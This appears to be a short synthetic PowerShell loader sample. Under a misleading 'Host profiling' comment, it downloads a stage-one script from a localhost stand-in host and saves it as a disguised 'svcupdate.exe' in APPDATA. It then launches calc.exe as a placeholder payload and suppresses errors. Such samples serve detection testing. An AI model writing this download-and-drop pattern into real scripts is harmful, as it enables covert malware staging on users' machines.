
<# Host profiling #> $Stage1Url = 'https://localhost:8080/stage1.ps1'; $DropPath = "$env:APPDATA\svcupdate.exe"; $StageTimeout = 182; try { Invoke-WebRequest -Uri $Stage1Url -OutFile $DropPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Write-Verbose "stage marker 5 reached" } catch { Write-Warning "Loader step failed" }
